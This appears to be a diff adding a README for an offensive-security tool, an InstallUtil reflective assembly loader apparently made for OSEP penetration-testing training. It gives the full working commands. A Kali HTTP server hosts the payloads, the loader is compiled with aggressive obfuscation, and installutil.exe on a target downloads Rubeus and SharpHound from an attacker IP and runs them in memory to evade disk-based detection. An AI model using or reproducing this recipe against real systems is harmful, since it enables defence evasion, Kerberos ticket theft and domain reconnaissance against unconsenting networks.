@@ -1,0 +1,28 @@
+# OSEP InstallUtil Reflective Assembly Loader (Surgical Edition)
+
+This version downloads a .NET .exe file from a URL and executes it directly in memory within the `installutil.exe` process, allowing you to pass command-line arguments.
+
+### STEP 1: Host your Payload (On Kali)
+$ python3 -m http.server 80
+
+### STEP 2: Compile the Loader
+$ python3 /home/kali/OSEP-TOOLS/PayloadCompiler/PayloadCompiler.py \
+    -p /home/kali/OSEP-TOOLS/Helpers/InstallUtilBypass/AssemblyLoader/InstallUtil-AssemblyLoad.cs \
+    -m classic \
+    --obfuscate aggressive \
+    -o AssemblyLoader.exe
+
+### STEP 3: Execute on Target (with Arguments)
+Transfer AssemblyLoader.exe to the target and execute via installutil.exe. Use the `/URL` parameter for the payload and the `/ARGS` parameter for your tool's arguments.
+
+# Example: Run Rubeus.exe triage
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /URL=http://<KALI_IP>/Rubeus.exe /ARGS="triage" /U AssemblyLoader.exe
+
+# Example: Run SharpHound.exe -c All
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /URL=http://<KALI_IP>/SharpHound.exe /ARGS="-c All" /U AssemblyLoader.exe
+
+---
+NOTE:
+- The `/ARGS` value should be enclosed in quotes if it contains multiple flags.
+- This version is highly effective for running all your OSEP tools (Rubeus, SharpHound, Seatbelt) without them ever touching the disk.
+- If you see "Execution finished" without output, check if the tool requires admin privileges.
